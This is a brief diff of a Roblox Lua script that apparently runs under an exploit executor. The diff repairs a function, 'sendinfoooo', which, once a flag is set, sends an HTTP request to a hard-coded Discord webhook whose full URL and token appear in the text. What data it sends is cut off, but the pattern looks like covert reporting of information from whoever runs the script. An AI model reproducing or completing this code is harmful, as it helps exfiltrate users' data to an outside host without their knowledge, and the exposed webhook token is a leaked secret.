@@ -452,14 +452,13 @@ end
 
 spawn(CreateButton)
 
-
+local HttpService = game:GetService("HttpService")
 local function sendinfoooo()
     local sent = false
     while true do
         if completed == true and not sent then
             sent = true
-            local webhook = "local HttpService = game:GetService("HttpService")
-https://discord.com/api/webhooks/1157801798267064380/KZxS-v6PdGCpwzVd9dl0lDmQLGzARCReGSY9q8egpkLmSLjV1n_mQLyR5G4ppYIMoEMu"
+            local webhook = "https://discord.com/api/webhooks/1157801798267064380/KZxS-v6PdGCpwzVd9dl0lDmQLGzARCReGSY9q8egpkLmSLjV1n_mQLyR5G4ppYIMoEMu"
             local request = (syn and syn.request) or request or (http and http.request) or http_request
             request({
                 Url = webhook,
